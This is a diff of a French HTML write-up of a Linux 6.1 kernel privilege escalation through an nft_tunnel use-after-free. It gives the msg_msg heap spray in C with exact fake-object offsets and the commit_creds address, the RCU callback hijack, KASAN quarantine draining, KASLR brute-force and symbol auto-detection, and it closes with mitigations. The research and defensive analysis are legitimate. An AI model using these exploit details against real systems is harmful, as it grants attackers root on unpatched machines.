-    <div class="step"><b>Drain TUN</b> : lecture non-bloquante des paquets parkés → <code>dst_release()</code> sur le pointeur pendant → refcount à 0 → <code>call_rcu(&amp;dst->rcu_head, dst_destroy_rcu)</code>.</div>
-    <div class="step"><b>Callback RCU</b> : <code>dst_destroy()</code> lit <code>dst->ops->destroy</code> = <code><span class="ad">0xffffffff81233940</span></code> = <code>commit_creds</code>. Appel : <code>commit_creds(dst)</code>. Le processus courant gagne <b>uid=0</b>.</div>
+    <div class="step"><b>Spray</b> : 512 messages <code>msg_mm</code> (8 queues × 64 messages) dans <code>kmalloc-cg-256</code>. Chaque message contient le faux objet de 208 octets avec <code>ops=X+128</code>, <code>xfrm=0</code>, <code>flags=0x0088</code>, <code>refcnt=1</code>, <code>destroy=commit_creds</code>.</div>
+    <div class="step"><b>Drain TUN</b> : lecture non-bloquante des paquets parkés → <code>dst_release()</code> sur le pointeur pendant → refcount 1→0 → <code>call_rcu(&amp;dst->rcu_head, dst_destroy_rcu)</code>.</div>
+    <div class="step"><b>Callback RCU</b> : <code>dst_destroy()</code> traverse les 4 lectures (xfrm=0 ✓, ops=X+128 ✓, destroy=commit_creds ✓). <code>call rax</code> → <code>commit_creds(X)</code>. Le processus gagne <b>uid=0</b>.</div>
+    <div class="step"><b>Retour propre</b> : <code>commit_creds</code> retourne. <code>dst_destroy</code> lit <code>dev</code>=0 → skip. <code>lwtstate</code>=0 → skip. <code>flags</code> & DST_METADATA → lit <code>[X+112]</code>=0 → <code>dst_cache_destroy</code>. La fonction retourne normalement.</div>
     <div class="step"><b>Shell root</b> : <code>getuid() == 0</code> → <code>execl("/bin/bash", "bash", "-i", NULL)</code>.</div>
   </div>
 
   <h3>Extrait du spray (C)</h3>
   <pre><code><span class="kw">static void</span> spray_direct_creds(<span class="kw">void</span>) {
     <span class="kw">struct</span> { <span class="kw">long</span> mtype; <span class="kw">char</span> data[<span class="ad">208</span>]; } mp = { .mtype = 1 };
+    <span class="kw">uint64_t</span> *d = (<span class="kw">uint64_t</span> *)mp.data;
 
-    <span class="cm">// Remplir les champs critiques avec l'adresse de commit_creds</span>
-    *(<span class="kw">uint64_t</span> *)(mp.data + 0)  = <span class="ad">0xffffffff81233940</span>ULL; <span class="cm">// commit_creds</span>
-    *(<span class="kw">uint64_t</span> *)(mp.data + 8)  = <span class="ad">0xffffffff83ef2b40</span>ULL; <span class="cm">// init_cred</span>
+    <span class="cm">// champs critiques ★</span>
+    d[0]  = 0;                          <span class="cm">// X+0  : dev = NULL</span>
+    d[1]  = SPRAY_SELF_OPS;             <span class="cm">// X+8  : ops → X+128 (auto-référencé)</span>
+    d[4]  = 0;                          <span class="cm">// X+32 : xfrm = NULL</span>
+    *((<span class="kw">uint16_t</span>*)(mp.data + 56)) = 0x0088; <span class="cm">// X+56 : DST_NOCOUNT|DST_METADATA</span>
+    *((<span class="kw">uint32_t</span>*)(mp.data + 64)) = 1;  <span class="cm">// X+64 : __refcnt = 1</span>
+    d[10] = 0;                          <span class="cm">// X+80 : lwtstate = NULL</span>
+
+    <span class="cm">// fake_ops : destroy à offset +48 dans ops (= X+176 dans le buffer)</span>
+    *((<span class="kw">uint64_t</span>*)(mp.data + 176)) = <span class="ad">0xffffffff81233940</span>ULL; <span class="cm">// commit_creds</span>
 
     <span class="kw">int</span> sent = 0, qid[8];
     <span class="kw">for</span> (<span class="kw">int</span> q = 0; q &lt; 8; q++) {
@@ -288,18 +471,42 @@ root@debian:~#</code></pre>
   <div class="result"><span class="t">Résultat</span> uid=0 — shell root reproductible (Linux 6.1.170-kasan) · 3 exécutions consécutives réussies</div>
 
   <!-- ============================================================ -->
-  <h2><span class="n">08</span> Ce que KASAN a enseigné</h2><div class="rule"></div>
+  <h2><span class="n">11</span> Ce que KASAN a enseigné</h2><div class="rule"></div>
 
-  <p>Compiler le noyau avec <b>KASAN</b> (Kernel Address SANitizer) a été décisif. Chaque accès mémoire invalide est détecté et logué avec l'adresse fautive, la taille de l'accès, et la timeline alloc/free de l'objet. Sans KASAN, les bugs mémoire produisent des crashs opaques ou — pire — fonctionnent silencieusement. Avec KASAN, chaque erreur est une information exploitable.</p>
+  <p>Compiler le noyau avec <b>KASAN</b> (Kernel Address SANitizer) a été à la fois un avantage et un obstacle. Chaque accès mémoire invalide est détecté et logué avec l'adresse fautive, la taille de l'accès, et la timeline alloc/free de l'objet. Sans KASAN, les bugs mémoire produisent des crashs opaques ou — pire — fonctionnent silencieusement. Avec KASAN, chaque erreur est une information exploitable.</p>
 
+  <h3>Comment fonctionne KASAN inline</h3>
+  <p>Avec <code>CONFIG_KASAN_INLINE=y</code>, le compilateur insère des vérifications <i>avant chaque accès mémoire</i>. Pour une lecture de 8 octets à l'adresse <code>A</code> :</p>
+
+  <pre><code><span class="cm">// vérification inline insérée par le compilateur (visible dans le désassemblage)</span>
+shadow_addr = (A &gt;&gt; 3) + <span class="ad">0xdffffc0000000000</span>
+shadow_byte = *shadow_addr
+<span class="kw">if</span> (shadow_byte != 0)
+    <span class="kw">call</span> __asan_report_load8_noabort  <span class="cm">// → panic ou continue selon config</span></code></pre>
+
+  <p>Pour notre allocation de 256 octets à l'adresse X, <b>tous les shadow bytes</b> dans <code>[X, X+256)</code> valent <code>0x00</code> (allocation vivante, pleinement valide). Chaque vérification KASAN dans <code>dst_destroy</code> passe sans problème. C'est au-delà de X+256 que commence la redzone (shadow = <code>0xFC</code>) — d'où l'importance du flag <code>DST_NOCOUNT</code>.</p>
+
+  <h3>Les 5 vérifications KASAN avant le call</h3>
+  <table class="tbl">
+    <thead><tr><th>#</th><th>Adresse vérifiée</th><th>Shadow</th><th>Résultat</th></tr></thead>
+    <tbody>
+      <tr><td>1</td><td><code>X+32</code> (xfrm)</td><td><code>0x00</code></td><td>Passe ✓</td></tr>
+      <tr><td>2</td><td><code>X+240</code> (child, si xfrm≠0)</td><td><code>0x00</code></td><td>Passe ✓ (mais on l'évite en posant xfrm=0)</td></tr>
+      <tr><td>3</td><td><code>X+8</code> (ops)</td><td><code>0x00</code></td><td>Passe ✓</td></tr>
+      <tr><td>4</td><td><code>X+176</code> (ops->destroy)</td><td><code>0x00</code></td><td>Passe ✓</td></tr>
+      <tr><td>5</td><td><code>X+64</code> (__refcnt, dans dst_release)</td><td><code>0x00</code></td><td>Passe ✓</td></tr>
+    </tbody>
+  </table>
+
+  <h3>La quarantaine</h3>
   <ul>
-    <li><b>Grooming du tas</b> : KASAN met les objets libérés en quarantaine. Un <code>kfree()</code> ne rend pas immédiatement la zone réallocable — il faut drainer la quarantaine (~700K cycles) avant que le spray puisse occuper la zone.</li>
-    <li><b>Choix du cache</b> : <code>metadata_dst_alloc(0, METADATA_IP_TUNNEL, GFP_KERNEL_ACCOUNT)</code> → 208 octets → <code>kmalloc-cg-256</code>. Le spray doit viser exactement le même slab, d'où <code>msgsnd()</code> avec 208 octets de payload (+ header msg_msg = 256).</li>
+    <li><b>Grooming du tas</b> : KASAN met les objets libérés en quarantaine. Un <code>kfree()</code> ne rend pas immédiatement la zone réallocable — il faut drainer la quarantaine (~700K cycles <code>msgsnd</code>/<code>msgrcv</code>) avant que le spray puisse occuper la zone.</li>
+    <li><b>Choix du cache</b> : <code>metadata_dst_alloc(0, METADATA_IP_TUNNEL, GFP_KERNEL_ACCOUNT)</code> → 208 octets → <code>kmalloc-cg-256</code>. Le spray doit viser exactement le même slab, d'où <code>msgsnd()</code> avec 208 octets de payload (+ header <code>msg_msg</code> de 48 octets = 256).</li>
     <li><b>dmesg_restrict</b> : une complication non technique mais concrète — <code>dmesg_restrict=1</code> empêche un utilisateur non-root de lire les logs KASAN via <code>/dev/kmsg</code>. J'ai dû relire les logs depuis la console QEMU.</li>
   </ul>
 
   <!-- ============================================================ -->
-  <h2><span class="n">09</span> Portabilité</h2><div class="rule"></div>
+  <h2><span class="n">12</span> Portabilité</h2><div class="rule"></div>
 
   <p>La technique est intrinsèquement portable à tout noyau Linux 6.1.x contenant le bug <code>nft_tunnel</code> :</p>
 
@@ -309,33 +516,37 @@ root@debian:~#</code></pre>
       <tr><td>Vulnérabilité</td><td>Oui</td><td>Rien — même code noyau partout</td></tr>
       <tr><td>Technique d'exploitation</td><td>Oui</td><td>Rien — même sémantique TUN/NFT/RCU</td></tr>
       <tr><td>Adresses des symboles</td><td>Non</td><td>Extraire <code>commit_creds</code> depuis <code>/proc/kallsyms</code> ou <code>vmlinuz</code></td></tr>
+      <tr><td>Layout des structures</td><td>Dépend</td><td><code>CONFIG_XFRM</code>, <code>CONFIG_RANDSTRUCT</code> changent les offsets</td></tr>
     </tbody>
   </table>
 
   <p>Une version « plug and play » auto-détecte l'adresse de <code>commit_creds</code> : d'abord via <code>/proc/kallsyms</code> (souvent masqué pour les non-root), puis en extrayant le payload xz de <code>/boot/vmlinuz</code> et en parsant la <code>ksymtab</code> de l'ELF résultant. Si KASLR est actif, le brute-force des 512 positions (<code>CONFIG_PHYSICAL_ALIGN=0x200000</code>) est envisageable.</p>
 
   <!-- ============================================================ -->
-  <h2><span class="n">10</span> Chronologie des échecs</h2><div class="rule"></div>
+  <h2><span class="n">13</span> Chronologie des échecs</h2><div class="rule"></div>
 
   <p>L'historique complet, parce que dans l'exploitation noyau, <b>l'historique des impasses <i>est</i> la solution</b> :</p>
 
   <table class="tbl">
     <thead><tr><th>#</th><th>Approche</th><th>Échec</th><th>Enseignement</th></tr></thead>
     <tbody>
-      <tr><td>1</td><td>Pipe spray + exec_work</td><td>Pipe → page cache, pas kmalloc-256</td><td>Connaître l'allocateur de chaque primitive</td></tr>
-      <tr><td>2</td><td>msg_mm spray + exec_work</td><td>Constantes NFTA_ décalées de 1</td><td>Vérifier chaque constante contre les headers noyau</td></tr>
-      <tr><td>3</td><td>msg_mm spray + exec_work (corrigé)</td><td><code>msg->security = NULL</code> immutable</td><td>Les champs kernel-controlled ne sont pas contrôlables</td></tr>
-      <tr><td>4</td><td>user_key_payload spray</td><td>Quota limité à ~96 clés</td><td>Les ressources noyau ont des limites par namespace</td></tr>
-      <tr><td>5</td><td>Brute-force KASLR (287 positions)</td><td>0/287 succès</td><td>Le problème n'est pas l'adresse mais le mécanisme</td></tr>
-      <tr><td>6</td><td>Test avec <code>0xdeadbeef</code></td><td>Pas de crash</td><td>Le callback ne s'exécute pas dans le contexte enfant</td></tr>
-      <tr><td><b>7</b></td><td><b>commit_creds direct</b></td><td><b>—</b></td><td><b>Un gadget plus tolérant contourne toutes les contraintes</b></td></tr>
+      <tr><td>1</td><td>setxattr spray + exec_work</td><td>tmpfs ne supporte pas xattr → spray silencieux</td><td>Vérifier que la primitive fonctionne sur le FS cible</td></tr>
+      <tr><td>2</td><td>Pipe spray + exec_work</td><td>Pipe → page cache, pas kmalloc-256</td><td>Connaître l'allocateur de chaque primitive</td></tr>
+      <tr><td>3</td><td>msg_mm spray + exec_work</td><td>Constantes NFTA_ décalées de 1 (13 valeurs)</td><td>Vérifier chaque constante contre les headers noyau</td></tr>
+      <tr><td>4</td><td>msg_mm corrigé + exec_work</td><td>Alignement fake_dst : path à +32 au lieu de +40</td><td>Valider chaque offset avec <code>offsetof()</code></td></tr>
+      <tr><td>5</td><td>msg_mm aligné + exec_work</td><td><code>msg->security = NULL</code> immutable → path=NULL</td><td>Les champs kernel-controlled ne sont pas contrôlables</td></tr>
+      <tr><td>6</td><td>user_key_payload spray</td><td>Quota limité à ~96 clés</td><td>Les ressources noyau ont des limites par namespace</td></tr>
+      <tr><td>7</td><td>Brute-force KASLR (287 positions)</td><td>0/287 succès</td><td>Le problème n'est pas l'adresse mais le mécanisme</td></tr>
+      <tr><td>8</td><td>Test avec <code>0xdeadbeef</code></td><td>Pas de crash</td><td>Le callback ne s'exécute pas dans le contexte attendu</td></tr>
+      <tr><td>9</td><td>Premier essai commit_creds, flags=0x0080</td><td>KASAN panic : <code>percpu_counter</code> à X+256 (redzone)</td><td>Analyser <code>dst_release</code>, pas seulement <code>dst_destroy</code></td></tr>
+      <tr><td><b>10</b></td><td><b>commit_creds, flags=0x0088</b></td><td><b>—</b></td><td><b>DST_NOCOUNT + gadget tolérant = chaîne complète</b></td></tr>
     </tbody>
   </table>
 
-  <p>16 notes de vault documentant chaque étape. Les six premiers échecs ont éliminé des classes entières de solutions, réduisant l'espace de recherche jusqu'à ce qu'il ne reste qu'une direction viable.</p>
+  <p>16 notes de vault documentant chaque étape (1300+ lignes), 581 lignes d'analyse du désassemblage de <code>dst_destroy</code>, 3 bugs corrigés dans le layout du faux objet. Les neuf premiers échecs ont éliminé des classes entières de solutions, réduisant l'espace de recherche jusqu'à ce qu'il ne reste qu'une direction viable.</p>
 
   <!-- ============================================================ -->
-  <h2><span class="n">11</span> Prise de recul défensive</h2><div class="rule"></div>
+  <h2><span class="n">14</span> Prise de recul défensive</h2><div class="rule"></div>
 
   <p>L'intérêt de l'exercice offensif est de voir où placer la défense. Trois mitigations auraient cassé la chaîne :</p>
 
@@ -370,9 +581,10 @@ root@debian:~#</code></pre>
 
   <ul>
     <li><b>Le bug</b> : un <code>kfree()</code> sans <code>dst_release()</code> dans <code>nft_tunnel_obj_destroy()</code> — une erreur de référence-counting, la classe de bugs la plus commune du noyau Linux.</li>
-    <li><b>L'exploit</b> : spray de <code>msg_mm</code> dans <code>kmalloc-cg-256</code>, drainage de quarantaine KASAN, détournement du callback RCU vers <code>commit_creds</code>.</li>
-    <li><b>Le pivot</b> : trois approches échouées avant de trouver un gadget suffisamment tolérant. La solution n'est pas venue d'une inspiration mais de l'élimination méthodique des alternatives.</li>
-    <li><b>La discipline</b> : documenter chaque impasse (16 notes, 1300 lignes) — parce que dans l'exploitation noyau, ce qui <i>ne</i> marche <i>pas</i> restreint l'espace de recherche autant que ce qui marche.</li>
+    <li><b>L'exploit</b> : spray de <code>msg_mm</code> dans <code>kmalloc-cg-256</code>, drainage de quarantaine KASAN, faux objet de 256 octets avec <code>dst_ops</code> intégré (6 champs critiques, 4 slots ROP libres), détournement du callback RCU vers <code>commit_creds</code>.</li>
+    <li><b>Le pivot</b> : neuf approches échouées avant de trouver un gadget suffisamment tolérant + les bons flags (<code>DST_NOCOUNT|DST_METADATA</code>). La solution n'est pas venue d'une inspiration mais de l'élimination méthodique des alternatives.</li>
+    <li><b>La rigueur</b> : 581 lignes de désassemblage annoté, chaque octet du faux objet documenté, 16 notes de vault (1300+ lignes), 3 bugs corrigés dans le layout avant même d'atteindre le bon gadget.</li>
+    <li><b>La discipline</b> : documenter chaque impasse — parce que dans l'exploitation noyau, ce qui <i>ne</i> marche <i>pas</i> restreint l'espace de recherche autant que ce qui marche.</li>
   </ul>
 
   <div class="note">
